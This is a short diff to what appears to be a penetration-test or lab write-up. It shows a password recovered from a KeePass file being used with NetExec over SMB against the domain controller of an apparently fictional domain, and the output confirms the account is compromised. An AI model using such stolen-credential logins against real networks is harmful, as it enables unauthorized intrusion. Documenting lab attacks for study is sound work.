@@ -274,4 +274,11 @@ showard:5rtfgvb^RTFGVB
 ```
 This is everything from the keepass file
 
-# Access as `showard` on  
+# Access as `showard` on `dc.ext.darkhaven.local`
+```python
+nxc smb dc.ext.darkhaven.local -u 'showard' -p '5rtfgvb^RTFGVB'                      
+SMB         10.10.10.136    445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:ext.darkhaven.local) (signing:True) (SMBv1:None)
+SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\showard:5rtfgvb^RTFGVB
+```
+This user is now compromised
+
